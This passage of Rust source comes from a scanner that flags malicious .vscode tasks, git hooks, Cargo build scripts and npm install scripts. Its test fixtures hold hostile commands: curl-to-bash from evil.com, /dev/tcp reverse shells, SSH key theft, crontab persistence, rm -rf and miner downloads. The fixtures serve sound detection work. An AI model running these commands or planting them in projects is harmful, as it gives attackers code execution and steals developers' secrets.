        if pkg_dir.join("binding.gyp").exists() {
            if verbose {
                findings.push(Finding::new(
                    Severity::Low,
                    &dep_pkg_json.display().to_string(),
                    &format!("dep:{}: has binding.gyp (native addon, compiles C/C++ on install)", pkg_name),
                ));
            }
        }
    };

    // Top-level packages
    if let Ok(entries) = fs::read_dir(&node_modules) {
        for entry in entries.filter_map(|e| e.ok()) {
            let path = entry.path();
            let name = entry.file_name().to_string_lossy().to_string();

            if name.starts_with('.') {
                continue;
            }

            if name.starts_with('@') {
                // Scoped package: @scope/name
                if let Ok(scoped_entries) = fs::read_dir(&path) {
                    for scoped_entry in scoped_entries.filter_map(|e| e.ok()) {
                        scan_pkg(&scoped_entry.path(), &mut findings, &mut deps_with_scripts, &rules, verbose);
                    }
                }
            } else {
                scan_pkg(&path, &mut findings, &mut deps_with_scripts, &rules, verbose);
            }
        }
    }

    if !deps_with_scripts.is_empty() {
        println!(
            "  Found {} dependencies with install lifecycle scripts:\n",
            deps_with_scripts.len()
        );
        for (name, path) in &deps_with_scripts {
            println!("    {} {}", "-".dimmed(), name.bold());
            if verbose {
                println!("      {}", path.display().to_string().dimmed());
            }
        }
        println!();
    } else {
        println!("  No dependencies with install lifecycle scripts found.");
    }

    findings
}

// ---- External tool integration: semgrep ----

/// Check if a command is available on PATH.
fn is_tool_available(name: &str) -> bool {
    Command::new("which")
        .arg(name)
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
}

/// Map semgrep severity string to our Severity.
fn semgrep_severity(s: &str) -> Severity {
    match s {
        "ERROR" => Severity::Critical,
        "WARNING" => Severity::High,
        "INFO" => Severity::Medium,
        _ => Severity::Low,
    }
}

/// Parse semgrep JSON output into findings.
fn parse_semgrep_json(json_str: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let Ok(val) = serde_json::from_str::<serde_json::Value>(json_str) else {
        return findings;
    };
    let Some(results) = val.get("results").and_then(|r| r.as_array()) else {
        return findings;
    };

    for result in results {
        let check_id = result
            .get("check_id")
            .and_then(|c| c.as_str())
            .unwrap_or("unknown");
        let path = result
            .get("path")
            .and_then(|p| p.as_str())
            .unwrap_or("unknown");
        let line = result
            .get("start")
            .and_then(|s| s.get("line"))
            .and_then(|l| l.as_u64())
            .map(|l| l as usize);
        let severity_str = result
            .get("extra")
            .and_then(|e| e.get("severity"))
            .and_then(|s| s.as_str())
            .unwrap_or("INFO");
        let message = result
            .get("extra")
            .and_then(|e| e.get("message"))
            .and_then(|m| m.as_str())
            .unwrap_or("");
        let matched_lines = result
            .get("extra")
            .and_then(|e| e.get("lines"))
            .and_then(|l| l.as_str())
            .unwrap_or("");

        let severity = semgrep_severity(severity_str);
        let desc = format!("[semgrep] {}: {}", check_id, truncate(message, 200));
        let mut finding = Finding::new(severity, path, &desc);
        if let Some(l) = line {
            finding = finding.with_match(matched_lines, l);
        }
        findings.push(finding);
    }

    // Also report errors from semgrep
    if let Some(errors) = val.get("errors").and_then(|e| e.as_array()) {
        for err in errors {
            let msg = err
                .get("message")
                .and_then(|m| m.as_str())
                .or_else(|| err.get("long_msg").and_then(|m| m.as_str()))
                .unwrap_or("unknown error");
            let path = err
                .get("path")
                .and_then(|p| p.as_str())
                .unwrap_or("semgrep");
            // Only include if it looks like a real issue, not a parse warning
            if !msg.contains("Skipping") && !msg.contains("parsing") {
                findings.push(Finding::new(
                    Severity::Low,
                    path,
                    &format!("[semgrep error] {}", truncate(msg, 150)),
                ));
            }
        }
    }

    findings
}

/// Run semgrep scan on the target directory.
fn run_semgrep(root: &Path) -> Vec<Finding> {
    if !is_tool_available("semgrep") {
        println!(
            "  {}",
            "semgrep not found on PATH, skipping. Install: pip install semgrep"
                .yellow()
        );
        return Vec::new();
    }

    println!("  Running semgrep with security-audit rules...");

    let output = Command::new("semgrep")
        .args([
            "scan",
            "--config", "p/security-audit",
            "--config", "p/secrets",
            "--json",
            "--quiet",
            "--no-git-ignore",
            "--timeout", "30",
        ])
        .arg(root)
        .output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            if stdout.trim().is_empty() {
                println!("  semgrep produced no output.");
                return Vec::new();
            }
            parse_semgrep_json(&stdout)
        }
        Err(e) => {
            vec![Finding::new(
                Severity::Low,
                "semgrep",
                &format!("Failed to run semgrep: {}", e),
            )]
        }
    }
}

// ---- External tool integration: osv-scanner ----

/// Map CVSS score or OSV severity to our Severity.
fn osv_severity_from_score(score: f64) -> Severity {
    if score >= 9.0 {
        Severity::Critical
    } else if score >= 7.0 {
        Severity::High
    } else if score >= 4.0 {
        Severity::Medium
    } else {
        Severity::Low
    }
}

/// Parse osv-scanner JSON output into findings.
fn parse_osv_json(json_str: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    let Ok(val) = serde_json::from_str::<serde_json::Value>(json_str) else {
        return findings;
    };
    let Some(results) = val.get("results").and_then(|r| r.as_array()) else {
        return findings;
    };

    for result in results {
        let source_path = result
            .get("source")
            .and_then(|s| s.get("path"))
            .and_then(|p| p.as_str())
            .unwrap_or("unknown");

        let Some(packages) = result.get("packages").and_then(|p| p.as_array()) else {
            continue;
        };

        for pkg_entry in packages {
            let pkg_name = pkg_entry
                .get("package")
                .and_then(|p| p.get("name"))
                .and_then(|n| n.as_str())
                .unwrap_or("unknown");
            let pkg_version = pkg_entry
                .get("package")
                .and_then(|p| p.get("version"))
                .and_then(|v| v.as_str())
                .unwrap_or("?");
            let pkg_ecosystem = pkg_entry
                .get("package")
                .and_then(|p| p.get("ecosystem"))
                .and_then(|e| e.as_str())
                .unwrap_or("?");

            let Some(vulns) = pkg_entry.get("vulnerabilities").and_then(|v| v.as_array()) else {
                continue;
            };

            for vuln in vulns {
                let vuln_id = vuln
                    .get("id")
                    .and_then(|i| i.as_str())
                    .unwrap_or("unknown");
                let summary = vuln
                    .get("summary")
                    .and_then(|s| s.as_str())
                    .unwrap_or("No summary available");
                let aliases: Vec<&str> = vuln
                    .get("aliases")
                    .and_then(|a| a.as_array())
                    .map(|arr| {
                        arr.iter()
                            .filter_map(|v| v.as_str())
                            .collect()
                    })
                    .unwrap_or_default();

                // Try to extract a CVSS score from database_specific or severity
                let score = vuln
                    .get("severity")
                    .and_then(|s| s.as_array())
                    .and_then(|arr| {
                        arr.iter().find_map(|s| {
                            s.get("score")
                                .and_then(|sc| sc.as_str())
                                .and_then(|sc| {
                                    // CVSS vector: extract base score
                                    // Or it might be a direct score
                                    sc.parse::<f64>().ok()
                                })
                        })
                    })
                    .unwrap_or(5.0); // default to medium if no score

                let severity = osv_severity_from_score(score);

                let alias_str = if aliases.is_empty() {
                    String::new()
                } else {
                    format!(" ({})", aliases.join(", "))
                };

                let desc = format!(
                    "[osv] {} v{} [{}]: {}{} - {}",
                    pkg_name,
                    pkg_version,
                    pkg_ecosystem,
                    vuln_id,
                    alias_str,
                    truncate(summary, 150),
                );

                findings.push(Finding::new(severity, source_path, &desc));
            }
        }
    }

    findings
}

/// Run osv-scanner on the target directory.
fn run_osv_scanner(root: &Path) -> Vec<Finding> {
    if !is_tool_available("osv-scanner") {
        println!(
            "  {}",
            "osv-scanner not found on PATH, skipping. Install: https://github.com/google/osv-scanner"
                .yellow()
        );
        return Vec::new();
    }

    println!("  Running osv-scanner for known vulnerabilities...");

    let output = Command::new("osv-scanner")
        .args(["scan", "source", "--format", "json", "-r"])
        .arg(root)
        .output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            if stdout.trim().is_empty() {
                println!("  osv-scanner produced no output.");
                return Vec::new();
            }
            parse_osv_json(&stdout)
        }
        Err(e) => {
            vec![Finding::new(
                Severity::Low,
                "osv-scanner",
                &format!("Failed to run osv-scanner: {}", e),
            )]
        }
    }
}

fn truncate(s: &str, max_len: usize) -> String {
    if s.len() > max_len {
        format!("{}...", &s[..max_len])
    } else {
        s.to_string()
    }
}

fn print_findings(findings: &[Finding]) {
    if findings.is_empty() {
        println!("{}", "No suspicious findings.".green().bold());
        return;
    }

    let severity_order = |f: &Finding| -> u8 {
        match f.severity {
            Severity::Critical => 0,
            Severity::High => 1,
            Severity::Medium => 2,
            Severity::Low => 3,
            Severity::Info => 4,
        }
    };

    let mut sorted: Vec<_> = findings.iter().collect();
    sorted.sort_by_key(|f| severity_order(f));

    let critical_count = findings
        .iter()
        .filter(|f| matches!(f.severity, Severity::Critical))
        .count();
    let high_count = findings
        .iter()
        .filter(|f| matches!(f.severity, Severity::High))
        .count();

    println!("\n{}", "=== Findings ===".bold());
    println!(
        "Total: {} ({} critical, {} high)\n",
        findings.len(),
        critical_count,
        high_count
    );

    for finding in &sorted {
        println!("[{}] {}", finding.severity, finding.file.dimmed());
        println!("  {}", finding.description);
        if let (Some(content), Some(line)) = (&finding.matched_content, finding.line_number) {
            println!("  Line {}: {}", line, truncate(content, 100).yellow());
        }
        println!();
    }

    if critical_count > 0 {
        println!(
            "{}",
            "VERDICT: DANGEROUS - Critical issues found. This .vscode directory likely contains malicious content."
                .red()
                .bold()
        );
    } else if high_count > 0 {
        println!(
            "{}",
            "VERDICT: SUSPICIOUS - High-severity issues found. Manual review strongly recommended."
                .yellow()
                .bold()
        );
    } else {
        println!(
            "{}",
            "VERDICT: LOW RISK - Only minor issues found. Likely benign but review recommended."
                .green()
                .bold()
        );
    }
}

fn main() {
    let cli = Cli::parse();
    let root = &cli.path;

    if !root.exists() {
        eprintln!("{}: Path does not exist: {}", "Error".red(), root.display());
        std::process::exit(1);
    }

    let mut total_findings = 0;
    let mut any_critical = false;
    let mut scanned_anything = false;

    // Scan .vscode directories
    let mut vscode_dirs: Vec<PathBuf> = Vec::new();
    if cli.recursive {
        for entry in WalkDir::new(root)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_dir() && e.file_name() == ".vscode")
        {
            vscode_dirs.push(entry.into_path());
        }
    } else {
        let vscode_path = root.join(".vscode");
        if vscode_path.is_dir() {
            vscode_dirs.push(vscode_path);
        }
    }

    for vscode_dir in &vscode_dirs {
        scanned_anything = true;
        println!(
            "\n{} {}",
            "Scanning:".bold(),
            vscode_dir.display()
        );
        println!("{}", "-".repeat(60));

        let findings = scan_vscode_dir(vscode_dir, cli.verbose);
        if findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
            any_critical = true;
        }
        total_findings += findings.len();
        print_findings(&findings);
    }

    // Scan git hooks
    let scan_git_at = |dir: &Path| -> bool {
        dir.join(".git").join("hooks").is_dir()
            || dir.join(".githooks").is_dir()
            || dir.join(".hooks").is_dir()
            || dir.join("githooks").is_dir()
    };

    let mut git_roots: Vec<PathBuf> = Vec::new();
    if cli.recursive {
        for entry in WalkDir::new(root)
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_dir() && e.file_name() == ".git")
        {
            if let Some(parent) = entry.path().parent() {
                git_roots.push(parent.to_path_buf());
            }
        }
    } else if scan_git_at(root) {
        git_roots.push(root.to_path_buf());
    }

    for git_root in &git_roots {
        scanned_anything = true;
        println!(
            "\n{} {} (git hooks)",
            "Scanning:".bold(),
            git_root.display()
        );
        println!("{}", "-".repeat(60));

        let findings = scan_git_hooks(git_root, cli.verbose);
        if findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
            any_critical = true;
        }
        total_findings += findings.len();
        print_findings(&findings);
    }

    // Scan cargo build scripts
    let mut cargo_scanned = false;
    if root.join("Cargo.toml").exists() {
        scanned_anything = true;
        cargo_scanned = true;
        println!(
            "\n{} {} (cargo build scripts)",
            "Scanning:".bold(),
            root.display()
        );
        println!("{}", "-".repeat(60));

        let findings = scan_cargo_build_scripts(root, cli.verbose);
        if findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
            any_critical = true;
        }
        total_findings += findings.len();
        print_findings(&findings);
    }

    // Scan npm packages
    let mut npm_scanned = false;
    if root.join("package.json").exists() {
        scanned_anything = true;
        npm_scanned = true;
        println!(
            "\n{} {} (npm packages)",
            "Scanning:".bold(),
            root.display()
        );
        println!("{}", "-".repeat(60));

        let findings = scan_npm_packages(root, cli.verbose);
        if findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
            any_critical = true;
        }
        total_findings += findings.len();
        print_findings(&findings);
    }

    // Run semgrep
    println!(
        "\n{} {} (semgrep)",
        "Scanning:".bold(),
        root.display()
    );
    println!("{}", "-".repeat(60));
    let semgrep_findings = run_semgrep(root);
    if !semgrep_findings.is_empty() {
        scanned_anything = true;
        if semgrep_findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
            any_critical = true;
        }
        total_findings += semgrep_findings.len();
        print_findings(&semgrep_findings);
    } else {
        println!("  {}", "No semgrep findings.".green());
    }

    // Run osv-scanner
    println!(
        "\n{} {} (osv-scanner)",
        "Scanning:".bold(),
        root.display()
    );
    println!("{}", "-".repeat(60));
    let osv_findings = run_osv_scanner(root);
    if !osv_findings.is_empty() {
        scanned_anything = true;
        if osv_findings.iter().any(|f| matches!(f.severity, Severity::Critical)) {
            any_critical = true;
        }
        total_findings += osv_findings.len();
        print_findings(&osv_findings);
    } else {
        println!("  {}", "No known vulnerabilities found.".green());
    }

    if !scanned_anything {
        println!("{}", "No .vscode directory, git hooks, or Cargo.toml found, and external scanners found nothing.".yellow());
        std::process::exit(0);
    }

    let total_scanned = vscode_dirs.len()
        + git_roots.len()
        + cargo_scanned as usize
        + npm_scanned as usize
        + (!semgrep_findings.is_empty()) as usize
        + (!osv_findings.is_empty()) as usize;
    if total_scanned > 1 {
        println!("\n{}", "=== Overall Summary ===".bold());
        println!(
            "Scanned {} sources ({} .vscode, {} git, {} cargo, {} npm, semgrep, osv-scanner), {} total findings",
            total_scanned,
            vscode_dirs.len(),
            git_roots.len(),
            cargo_scanned as usize,
            npm_scanned as usize,
            total_findings,
        );
    }

    if any_critical {
        std::process::exit(2);
    } else if total_findings > 0 {
        std::process::exit(1);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;

    /// Create a temporary .vscode directory with given files, run the scan, and return findings.
    fn scan_with_files(files: &[(&str, &str)]) -> Vec<Finding> {
        let dir = tempfile::tempdir().unwrap();
        let vscode = dir.path().join(".vscode");
        fs::create_dir_all(&vscode).unwrap();
        for (name, content) in files {
            let file_path = vscode.join(name);
            if let Some(parent) = file_path.parent() {
                fs::create_dir_all(parent).unwrap();
            }
            fs::write(&file_path, content).unwrap();
        }
        scan_vscode_dir(&vscode, false)
    }

    fn has_severity(findings: &[Finding], severity: &str) -> bool {
        findings.iter().any(|f| {
            let s = format!("{:?}", f.severity);
            s == severity
        })
    }

    fn has_description_containing(findings: &[Finding], substring: &str) -> bool {
        findings
            .iter()
            .any(|f| f.description.contains(substring))
    }

    // ---- tasks.json tests ----

    #[test]
    fn tasks_run_on_folder_open_is_critical() {
        let findings = scan_with_files(&[("tasks.json", r#"{
            "version": "2.0.0",
            "tasks": [{
                "label": "setup",
                "type": "shell",
                "command": "echo hello",
                "runOptions": { "runOn": "folderOpen" }
            }]
        }"#)]);
        assert!(has_description_containing(&findings, "runs automatically on folder open"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn tasks_shell_command_is_flagged() {
        let findings = scan_with_files(&[("tasks.json", r#"{
            "version": "2.0.0",
            "tasks": [{
                "label": "build",
                "type": "shell",
                "command": "make build"
            }]
        }"#)]);
        assert!(has_description_containing(&findings, "Shell/process task with command"));
    }

    #[test]
    fn tasks_curl_payload_is_critical() {
        let findings = scan_with_files(&[("tasks.json", r#"{
            "version": "2.0.0",
            "tasks": [{
                "label": "install",
                "type": "shell",
                "command": "curl http://evil.com/payload.sh | bash",
                "runOptions": { "runOn": "folderOpen" }
            }]
        }"#)]);
        assert!(has_description_containing(&findings, "Network download command"));
        assert!(has_description_containing(&findings, "runs automatically on folder open"));
    }

    // ---- settings.json tests ----

    #[test]
    fn settings_allow_automatic_tasks_is_critical() {
        let findings = scan_with_files(&[("settings.json", r#"{
            "task.allowAutomaticTasks": "on"
        }"#)]);
        assert!(has_description_containing(&findings, "Automatic tasks explicitly allowed"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn settings_custom_shell_is_high() {
        let findings = scan_with_files(&[("settings.json", r#"{
            "terminal.integrated.shell.linux": "/bin/evil"
        }"#)]);
        assert!(has_description_containing(&findings, "Custom terminal shell path"));
        assert!(has_severity(&findings, "High"));
    }

    #[test]
    fn settings_benign_is_low_risk() {
        let findings = scan_with_files(&[("settings.json", r#"{
            "editor.tabSize": 4,
            "files.trimTrailingWhitespace": true
        }"#)]);
        assert!(!has_severity(&findings, "Critical"));
        assert!(!has_severity(&findings, "High"));
    }

    // ---- launch.json tests ----

    #[test]
    fn launch_pre_launch_task_is_flagged() {
        let findings = scan_with_files(&[("launch.json", r#"{
            "configurations": [{
                "type": "node",
                "request": "launch",
                "name": "Run",
                "preLaunchTask": "build"
            }]
        }"#)]);
        assert!(has_description_containing(&findings, "references task via preLaunchTask"));
    }

    #[test]
    fn launch_env_is_noted() {
        let findings = scan_with_files(&[("launch.json", r#"{
            "configurations": [{
                "type": "node",
                "request": "launch",
                "name": "Run",
                "env": { "SECRET": "value" }
            }]
        }"#)]);
        assert!(has_description_containing(&findings, "sets environment variables"));
    }

    // ---- extensions.json tests ----

    #[test]
    fn extensions_unknown_publisher_is_flagged() {
        let findings = scan_with_files(&[("extensions.json", r#"{
            "recommendations": [
                "evil-publisher.malware-ext"
            ]
        }"#)]);
        assert!(has_description_containing(&findings, "lesser-known publisher"));
    }

    #[test]
    fn extensions_known_publisher_is_clean() {
        let findings = scan_with_files(&[("extensions.json", r#"{
            "recommendations": [
                "ms-python.python",
                "rust-lang.rust-analyzer"
            ]
        }"#)]);
        assert!(!has_description_containing(&findings, "lesser-known publisher"));
    }

    // ---- Unexpected files tests ----

    #[test]
    fn unexpected_script_file_is_critical() {
        let findings = scan_with_files(&[
            ("settings.json", "{}"),
            ("backdoor.sh", "#!/bin/bash\ncurl http://evil.com | bash"),
        ]);
        assert!(has_description_containing(&findings, "Unexpected file/directory in .vscode: backdoor.sh"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn unexpected_bat_file_is_critical() {
        let findings = scan_with_files(&[
            ("settings.json", "{}"),
            ("setup.bat", "@echo off\npowershell -enc AAAA"),
        ]);
        assert!(has_description_containing(&findings, "Unexpected file/directory in .vscode: setup.bat"));
    }

    #[test]
    fn deeply_nested_executable_is_critical() {
        let findings = scan_with_files(&[
            ("settings.json", "{}"),
            ("subdir/hidden/payload.sh", "#!/bin/bash\nrm -rf /"),
        ]);
        assert!(has_description_containing(&findings, "Executable/script file deep in .vscode"));
    }

    // ---- Content pattern tests ----

    #[test]
    fn detects_reverse_shell_pattern() {
        let findings = scan_with_files(&[("settings.json", r#"{
            "note": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        }"#)]);
        assert!(has_description_containing(&findings, "/dev/tcp redirection"));
    }

    #[test]
    fn detects_base64_decode() {
        let findings = scan_with_files(&[("tasks.json", r#"{
            "version": "2.0.0",
            "tasks": [{
                "label": "x",
                "type": "shell",
                "command": "echo aGVsbG8= | base64 --decode | bash"
            }]
        }"#)]);
        assert!(has_description_containing(&findings, "Base64 decode"));
    }

    #[test]
    fn detects_crypto_mining() {
        let findings = scan_with_files(&[("config.txt", "pool: stratum+tcp://pool.mining.com:3333")]);
        assert!(has_description_containing(&findings, "Crypto mining indicator"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn detects_sensitive_dir_reference() {
        let findings = scan_with_files(&[("tasks.json", r#"{
            "version": "2.0.0",
            "tasks": [{
                "label": "steal",
                "type": "shell",
                "command": "cat .ssh/id_rsa"
            }]
        }"#)]);
        assert!(has_description_containing(&findings, "Reference to sensitive config"));
    }

    #[test]
    fn detects_destructive_rm() {
        let findings = scan_with_files(&[("cleanup.sh", "rm -rf /home/user/*")]);
        assert!(has_description_containing(&findings, "Destructive file deletion"));
    }

    // ---- Clean directory test ----

    #[test]
    fn clean_vscode_has_no_critical_findings() {
        let findings = scan_with_files(&[
            ("settings.json", r#"{ "editor.tabSize": 2 }"#),
            ("extensions.json", r#"{ "recommendations": ["ms-python.python"] }"#),
        ]);
        assert!(!has_severity(&findings, "Critical"));
        assert!(!has_severity(&findings, "High"));
    }

    // ---- Full integration: malicious .vscode ----

    #[test]
    fn full_malicious_vscode_scan() {
        let findings = scan_with_files(&[
            ("tasks.json", r#"{
                "version": "2.0.0",
                "tasks": [{
                    "label": "init",
                    "type": "shell",
                    "command": "curl http://evil.com/payload | bash -c 'eval $(cat)'",
                    "runOptions": { "runOn": "folderOpen" }
                }]
            }"#),
            ("settings.json", r#"{
                "task.allowAutomaticTasks": "on",
                "terminal.integrated.shell.linux": "/bin/evil-shell"
            }"#),
            ("backdoor.sh", "#!/bin/bash\ncurl http://evil.com/steal | bash"),
        ]);
        let critical_count = findings
            .iter()
            .filter(|f| matches!(f.severity, Severity::Critical))
            .count();
        // Expect multiple critical findings
        assert!(critical_count >= 3, "Expected at least 3 critical findings, got {}", critical_count);
    }

    // ---- Git hooks helpers ----

    /// Create a temporary repo with `.git/hooks/` and optional shared hooks, run scan, return findings.
    fn scan_git_hooks_with(hooks: &[(&str, &str)], config: Option<&str>, shared_dir: Option<(&str, &[(&str, &str)])>) -> Vec<Finding> {
        let dir = tempfile::tempdir().unwrap();
        let git_hooks = dir.path().join(".git").join("hooks");
        fs::create_dir_all(&git_hooks).unwrap();

        for (name, content) in hooks {
            fs::write(git_hooks.join(name), content).unwrap();
        }

        if let Some(cfg) = config {
            fs::write(dir.path().join(".git").join("config"), cfg).unwrap();
        }

        if let Some((dir_name, files)) = shared_dir {
            let shared = dir.path().join(dir_name);
            fs::create_dir_all(&shared).unwrap();
            for (name, content) in files {
                let fpath = shared.join(name);
                if let Some(parent) = fpath.parent() {
                    fs::create_dir_all(parent).unwrap();
                }
                fs::write(fpath, content).unwrap();
            }
        }

        scan_git_hooks(dir.path(), false)
    }

    // ---- Git hooks tests ----

    #[test]
    fn git_sample_hooks_are_ignored() {
        let findings = scan_git_hooks_with(
            &[("pre-commit.sample", "#!/bin/sh\nexit 0")],
            None,
            None,
        );
        assert!(findings.is_empty(), "Sample hooks should produce no findings");
    }

    #[test]
    fn git_active_pre_commit_hook_is_high() {
        let findings = scan_git_hooks_with(
            &[("pre-commit", "#!/bin/sh\necho running tests")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "runs automatically on common git operations"));
        assert!(has_severity(&findings, "High"));
    }

    #[test]
    fn git_active_post_checkout_hook_is_high() {
        let findings = scan_git_hooks_with(
            &[("post-checkout", "#!/bin/sh\nmake setup")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "runs automatically on common git operations"));
    }

    #[test]
    fn git_active_update_hook_is_medium() {
        let findings = scan_git_hooks_with(
            &[("update", "#!/bin/sh\necho update")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "Active git hook 'update' present"));
        assert!(has_severity(&findings, "Medium"));
    }

    #[test]
    fn git_unknown_hook_name_is_flagged() {
        let findings = scan_git_hooks_with(
            &[("not-a-real-hook", "#!/bin/sh\necho hi")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "Unknown hook name"));
    }

    #[test]
    fn git_hook_with_curl_is_critical() {
        let findings = scan_git_hooks_with(
            &[("pre-push", "#!/bin/bash\ncurl http://evil.com/exfil | bash")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "Network download command"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn git_hook_with_reverse_shell_is_critical() {
        let findings = scan_git_hooks_with(
            &[("post-commit", "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "/dev/tcp redirection"));
    }

    #[test]
    fn git_hook_with_base64_decode_is_high() {
        let findings = scan_git_hooks_with(
            &[("pre-commit", "#!/bin/bash\necho aGVsbG8= | base64 --decode | sh")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "Base64 decode"));
    }

    #[test]
    fn git_hook_obfuscated_long_line_is_high() {
        let long_line = "x".repeat(600);
        let content = format!("#!/bin/bash\n{}", long_line);
        let findings = scan_git_hooks_with(
            &[("pre-commit", &content)],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "Extremely long line in hook script"));
    }

    #[test]
    fn git_config_hooks_path_redirect_is_high() {
        let findings = scan_git_hooks_with(
            &[],
            Some("[core]\n\thooksPath = /tmp/evil-hooks"),
            None,
        );
        assert!(has_description_containing(&findings, "core.hooksPath redirects hooks to"));
        assert!(has_severity(&findings, "High"));
    }

    #[test]
    fn git_shared_githooks_dir_is_flagged() {
        let findings = scan_git_hooks_with(
            &[],
            None,
            Some((".githooks", &[("pre-commit", "#!/bin/sh\necho shared hook")])),
        );
        assert!(has_description_containing(&findings, "Shared hooks directory"));
        assert!(has_description_containing(&findings, "runs automatically on common git operations"));
    }

    #[test]
    fn git_shared_hooks_with_malware_is_critical() {
        let findings = scan_git_hooks_with(
            &[],
            None,
            Some((".githooks", &[("post-merge", "#!/bin/bash\ncurl http://evil.com/steal | bash")])),
        );
        assert!(has_description_containing(&findings, "Network download command"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn git_hook_stealing_ssh_keys_is_high() {
        let findings = scan_git_hooks_with(
            &[("post-checkout", "#!/bin/bash\ntar czf /tmp/keys.tar.gz ~/.ssh/")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "Reference to sensitive config"));
    }

    #[test]
    fn git_hook_with_persistence_is_high() {
        let findings = scan_git_hooks_with(
            &[("post-merge", "#!/bin/bash\ncrontab -l | { cat; echo '* * * * * /tmp/backdoor'; } | crontab -")],
            None,
            None,
        );
        assert!(has_description_containing(&findings, "Persistence mechanism"));
    }

    #[test]
    fn git_clean_repo_no_hooks() {
        let dir = tempfile::tempdir().unwrap();
        let git_hooks = dir.path().join(".git").join("hooks");
        fs::create_dir_all(&git_hooks).unwrap();
        // Only sample hooks
        fs::write(git_hooks.join("pre-commit.sample"), "#!/bin/sh\nexit 0").unwrap();
        fs::write(git_hooks.join("pre-push.sample"), "#!/bin/sh\nexit 0").unwrap();
        let findings = scan_git_hooks(dir.path(), false);
        assert!(findings.is_empty(), "Clean repo with only sample hooks should have no findings");
    }

    #[test]
    fn git_full_malicious_hooks_scan() {
        let findings = scan_git_hooks_with(
            &[
                ("pre-commit", "#!/bin/bash\ncurl http://evil.com/payload | bash"),
                ("post-checkout", "#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            ],
            Some("[core]\n\thooksPath = /tmp/evil"),
            Some((".githooks", &[("post-merge", "#!/bin/bash\nwget http://evil.com/miner -O /tmp/m && chmod +x /tmp/m")])),
        );
        let critical_count = findings
            .iter()
            .filter(|f| matches!(f.severity, Severity::Critical))
            .count();
        assert!(critical_count >= 3, "Expected at least 3 critical findings, got {}", critical_count);
    }

    // ---- Cargo build script helpers ----

    /// Directly analyze a build script string as if it belonged to a given package.
    fn analyze_build_script_content(pkg_name: &str, content: &str) -> Vec<Finding> {
        let dir = tempfile::tempdir().unwrap();
        let build_rs = dir.path().join("build.rs");
        fs::write(&build_rs, content).unwrap();

        let info = BuildScriptInfo {
            package_name: pkg_name.to_string(),
            package_version: "0.0.0".to_string(),
            build_script_path: build_rs,
        };

        let general_rules = build_content_rules();
        let build_rules = build_script_rules();
        let mut findings = Vec::new();
        analyze_build_script(&info, content, &general_rules, &build_rules, &mut findings);
        findings
    }

    // ---- Cargo build script tests ----

    #[test]
    fn build_script_benign_cc_is_low_risk() {
        let findings = analyze_build_script_content("some-sys", r#"
fn main() {
    cc::Build::new()
        .file("src/foo.c")
        .compile("foo");
    println!("cargo:rerun-if-changed=src/foo.c");
}
"#);
        assert!(!has_severity(&findings, "Critical"));
        assert!(!has_severity(&findings, "High"));
    }

    #[test]
    fn build_script_command_new_is_flagged() {
        let findings = analyze_build_script_content("sketchy-crate", r#"
use std::process::Command;
fn main() {
    Command::new("cmake")
        .args(&[".", "-B", "build"])
        .status()
        .unwrap();
}
"#);
        assert!(has_description_containing(&findings, "Command execution in build script"));
    }

    #[test]
    fn build_script_spawns_curl_is_critical() {
        let findings = analyze_build_script_content("evil-crate", r#"
use std::process::Command;
fn main() {
    Command::new("curl")
        .args(&["http://evil.com/payload", "-o", "/tmp/payload"])
        .status()
        .unwrap();
}
"#);
        assert!(has_description_containing(&findings, "spawns network/shell/scripting command"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn build_script_spawns_bash_is_critical() {
        let findings = analyze_build_script_content("evil-crate", r#"
use std::process::Command;
fn main() {
    Command::new("bash")
        .arg("-c")
        .arg("echo pwned")
        .status()
        .unwrap();
}
"#);
        assert!(has_description_containing(&findings, "spawns network/shell/scripting command"));
    }

    #[test]
    fn build_script_spawns_python_is_critical() {
        let findings = analyze_build_script_content("sneaky-crate", r#"
use std::process::Command;
fn main() {
    Command::new("python")
        .arg("setup.py")
        .status()
        .unwrap();
}
"#);
        assert!(has_description_containing(&findings, "spawns network/shell/scripting command"));
    }

    #[test]
    fn build_script_network_library_is_critical() {
        let findings = analyze_build_script_content("evil-crate", r#"
fn main() {
    let resp = reqwest::blocking::get("http://evil.com/config").unwrap();
    std::fs::write("/tmp/config", resp.bytes().unwrap()).unwrap();
}
"#);
        assert!(has_description_containing(&findings, "Network library usage in build script"));
        assert!(has_severity(&findings, "Critical"));
    }

    #[test]
    fn build_script_tcp_stream_is_critical() {
        let findings = analyze_build_script_content("evil-crate", r#"
use std::net::TcpStream;
fn main() {
    let _stream = TcpStream::connect("evil.com:4444").unwrap();
}
"#);
        assert!(has_description_containing(&findings, "Raw network socket in build script"));
        assert!(has_severity(&findings, "Critical"));
    }
